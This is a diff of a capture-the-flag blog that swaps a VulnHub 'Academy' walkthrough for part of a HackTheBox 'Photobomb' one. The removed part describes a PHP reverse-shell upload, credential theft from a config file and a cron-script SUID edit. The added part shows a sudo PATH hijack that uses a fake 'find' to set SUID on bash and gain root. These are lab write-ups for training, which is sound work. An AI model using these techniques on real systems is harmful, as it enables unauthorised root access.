+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~$ whoami
+</span></span><span class="line"><span class="cl">wizard
+</span></span><span class="line"><span class="cl">wizard@photobomb:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span>
+</span></span><span class="line"><span class="cl">wizard@photobomb:~$ cat user.txt
+</span></span><span class="line"><span class="cl">8b9**************************acd
+</span></span></code></pre></div><div id="privesc-root" class="anchor">Privesc [Root]></div>
+<h2 class="relative group">Privesc [Root] 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#directory-fuzzing-https53ctfgithubiopostsvulnhubacademydirectory-fuzzing" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#privesc-root" aria-label="Anchor">#</a></span>        
     
-</h3><p>Found two directories.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	ffuf -u http://192.168.1.136/FUZZ -w /usr/share/wordlists/dirb/big.txt -c
-</span></span><span class="line"><span class="cl">academy                 <span class="o">[</span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms<span class="o">]</span>
-</span></span><span class="line"><span class="cl">phpmyadmin              <span class="o">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1ms<span class="o">]</span>
-</span></span></code></pre></div><p>Login to the <code>http://192.168.1.136/academy/</code> using <code>10201321:student</code> credentials.</p>
-<div id="foothold-www-data-https53ctfgithubiopostsvulnhubacademyfoothold-www-data" class="anchor">Foothold [www-data] <a href="https://53ctf.github.io/posts/vulnhub/academy/#foothold-www-data"   target="_blank">
-    #</a>></div>
-<h2 class="relative group">Foothold [www-data] <a href="https://53ctf.github.io/posts/vulnhub/academy/#foothold-www-data"   target="_blank">
-    #</a> 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#foothold-www-data-https53ctfgithubiopostsvulnhubacademyfoothold-www-data" aria-label="Anchor">#</a></span>        
-    
-</h2><p>Looking at the site, I noticed that we can upload images to our profile picture from <code>http://192.168.1.136/academy/my-profile.php</code>. So let’s upload one. But not a picture. Let’s upload a <code>PHP Reverse Shell Script</code> instead. And make sure to start a netcat listener before you press the upload button.</p>
-<p>As soon as you press the upload button, you will get a reverse shell from the target machine as the <code>www-data</code> user.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	whoami
-</span></span><span class="line"><span class="cl">www-data
-</span></span><span class="line"><span class="cl">&gt;	id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-</span></span></code></pre></div><div id="prives-grimmie-https53ctfgithubiopostsvulnhubacademyprives-grimmie" class="anchor">Prives [Grimmie] <a href="https://53ctf.github.io/posts/vulnhub/academy/#prives-grimmie"   target="_blank">
-    #</a>></div>
-<h2 class="relative group">Prives [Grimmie] <a href="https://53ctf.github.io/posts/vulnhub/academy/#prives-grimmie"   target="_blank">
-    #</a> 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#prives-grimmie-https53ctfgithubiopostsvulnhubacademyprives-grimmie" aria-label="Anchor">#</a></span>        
-    
-</h2><p>Looks like we have only one user.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	cat /etc/passwd <span class="p">|</span> grep sh
-</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
-</span></span><span class="line"><span class="cl">grimmie❌1000:1000:administrator,,,:/home/grimmie:/bin/bash
-</span></span></code></pre></div><p>Found MySQL database credentials from <code>/var/www/html/academy/includes/config.php</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$mysql_user</span> <span class="o">=</span> <span class="s2">&#34;grimmie&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$mysql_password</span> <span class="o">=</span> <span class="s2">&#34;My_V3ryS3cur3_P4ss&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$mysql_database</span> <span class="o">=</span> <span class="s2">&#34;onlinecourse&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>Login to the target machine as the user <code>grimmie</code> with the database credentials.</p>
-<div id="privesc-root-https53ctfgithubiopostsvulnhubacademyprivesc-root" class="anchor">Privesc [Root] <a href="https://53ctf.github.io/posts/vulnhub/academy/#privesc-root"   target="_blank">
-    #</a>></div>
-<h2 class="relative group">Privesc [Root] <a href="https://53ctf.github.io/posts/vulnhub/academy/#privesc-root"   target="_blank">
-    #</a> 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#privesc-root-https53ctfgithubiopostsvulnhubacademyprivesc-root" aria-label="Anchor">#</a></span>        
-    
-</h2><p>Running <code>linpeas.sh</code> gave me this.</p>
-<pre tabindex="0"><code>* * * * * /home/grimmie/backup.sh
-</code></pre><p>Its running this <code>/home/grimmie/backup.sh</code> every minutes. So let’s look at the <code>/home/grimmie/backup.sh</code> so we can collect more information about the PE vector here.</p>
-<p><code>/home/grimmie/backup.sh</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl">rm /tmp/backup.zip
-</span></span><span class="line"><span class="cl">zip -r /tmp/backup.zip /var/www/html/academy/includes
-</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /tmp/backup.zip
-</span></span></code></pre></div><p>Looks like we also have write permission to <code>/home/grimmie/backup.sh</code>.</p>
-<p>Edit the <code>/home/grimmie/backup.sh</code> like this.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl">chmod u+s /bin/bash
+</h2><p>User <code>wizard</code> can run <code>/opt/cleanup.sh</code> as the <code>root</code> user with no password and can change or add an environment variables.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> wizard on photobomb:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">rm /tmp/backup.zip
-</span></span><span class="line"><span class="cl">zip -r /tmp/backup.zip /var/www/html/academy/includes
-</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /tmp/backup.zip
-</span></span></code></pre></div><p>After a little while, you can see that <code>/bin/bash</code> now has SUID bit bind to it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	ls -la /bin/bash
-</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1168776</span> Apr <span class="m">18</span>  <span class="m">2019</span> /bin/bash
-</span></span></code></pre></div><p>Which means the game is over. Now you are the <code>root</code> user.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	/bin/bash -p
-</span></span><span class="line"><span class="cl">&gt;	whoami
+</span></span><span class="line"><span class="cl">User wizard may run the following commands on photobomb:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
+</span></span></code></pre></div><p>And that file is owned by root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~$ ls -la /opt/cleanup.sh
+</span></span><span class="line"><span class="cl">-r-xr-xr-x <span class="m">1</span> root root <span class="m">340</span> Sep <span class="m">15</span> 12:11 /opt/cleanup.sh
+</span></span></code></pre></div><p>If we read the <code>/opt/cleanup.sh</code>, we can notice the vulnerability right away.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>. /opt/.bashrc
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/wizard/photobomb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># clean up log files</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -s log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> ! <span class="o">[</span> -L log/photobomb.log <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl">  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
+</span></span><span class="line"><span class="cl">  /usr/bin/truncate -s0 log/photobomb.log
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># protect the priceless originals</span>
+</span></span><span class="line"><span class="cl">find source_images -type f -name <span class="s1">&#39;*.jpg&#39;</span> -exec chown root:root <span class="o">{}</span> <span class="se">\;</span>
+</span></span></code></pre></div><p>In this script, they did same mistake twice. The &lsquo;mistake&rsquo; is, when we specify a binary in a script, we need to specify its <code>realpath</code> instead of <code>relative path</code>. Which means if we want to specify <code>locate</code> inside of a script, we have to specify it <code>/usr/bin/locate</code> like this.</p>
+<p>In the <code>/opt/cleanup.sh</code> we have <code>cd</code> and <code>find</code> commands with that vulnerability. So let&rsquo;s exploit that and leverage our privileges to the <code>root</code> user.</p>
+<p>Create a malicious file called <code>find</code> and change permissions of it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~$ <span class="nb">echo</span> <span class="s2">&#34;chmod u+s /bin/bash&#34;</span> &gt; find
+</span></span><span class="line"><span class="cl">wizard@photobomb:~$ chmod +x find
+</span></span></code></pre></div><p>Then run the <code>/opt/cleanup.sh</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PWD</span>:<span class="nv">$PATH</span> /opt/cleanup.sh
+</span></span></code></pre></div><p>Now if look <code>/bin/bash</code> it has <code>SUID</code> bit bind to it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~$ ls -la /bin/bash
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1183448</span> Apr <span class="m">18</span>  <span class="m">2022</span> /bin/bash
+</span></span></code></pre></div><p>Now we can become root and capture the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~$ /bin/bash -p
+</span></span><span class="line"><span class="cl">bash-5.0# whoami
 </span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">bash-5.0# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span>
+</span></span><span class="line"><span class="cl">bash-5.0# cat /root/root.txt
+</span></span><span class="line"><span class="cl">c02**************************7f6
 </span></span></code></pre></div>
         </br></br>
         
 
       </div>
       <script>
-        var oid = "views_posts\/vulnhub\/academy\/index.md"
-        var oid_likes = "likes_posts\/vulnhub\/academy\/index.md"
+        var oid = "views_posts\/htb\/photobomb\/index.md"
+        var oid_likes = "likes_posts\/htb\/photobomb\/index.md"
       </script>
       
       
@@ -1212,7 +1209,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://53ctf.github.io/posts/vulnhub/academy/&amp;title=Academy"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://53ctf.github.io/posts/htb/photobomb/&amp;title=HackTheBox%20Photobomb"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1231,7 +1228,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=https://53ctf.github.io/posts/vulnhub/academy/&amp;text=Academy"
+      href="https://twitter.com/intent/tweet/?url=https://53ctf.github.io/posts/htb/photobomb/&amp;text=HackTheBox%20Photobomb"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1250,7 +1247,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=https://53ctf.github.io/posts/vulnhub/academy/&amp;resubmit=true&amp;title=Academy"
+      href="https://reddit.com/submit/?url=https://53ctf.github.io/posts/htb/photobomb/&amp;resubmit=true&amp;title=HackTheBox%20Photobomb"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1269,7 +1266,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=https://53ctf.github.io/posts/vulnhub/academy/&amp;description=Academy"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=https://53ctf.github.io/posts/htb/photobomb/&amp;description=HackTheBox%20Photobomb"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1288,7 +1285,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=https://53ctf.github.io/posts/vulnhub/academy/&amp;quote=Academy"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://53ctf.github.io/posts/htb/photobomb/&amp;quote=HackTheBox%20Photobomb"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1307,7 +1304,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=https://53ctf.github.io/posts/vulnhub/academy/&amp;subject=Academy"
+      href="mailto:?body=https://53ctf.github.io/posts/htb/photobomb/&amp;subject=HackTheBox%20Photobomb"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1335,7 +1332,7 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/htb/ambassador/">
+            <a class="flex group mr-3" href="/posts/htb/shoppy/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1347,11 +1344,11 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >HackTheBox Ambassador</span
+                  >HackTheBox Shoppy</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2023-01-28 00:00:00 &#43;0000 UTC">28 January 2023</time>
+                    <time datetime="2023-01-14 00:00:00 &#43;0000 UTC">14 January 2023</time>
                   
                 </span>
               </span>
@@ -1360,15 +1357,15 @@ This is a MD5 hash. So let’s crack it and get the actual password.</p>
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/posts/htb/extension/">
+            <a class="flex text-right group ml-3" href="/posts/notes/windows/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >HackTheBox Extension</span
+                  >Active Directory</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2023-02-05 13:25:12 &#43;0530 &#43;0530">5 February 2023</time>
+                    <time datetime="2023-01-18 12:36:43 &#43;0530 &#43;0530">18 January 2023</time>
                   
                 </span>
               </span>
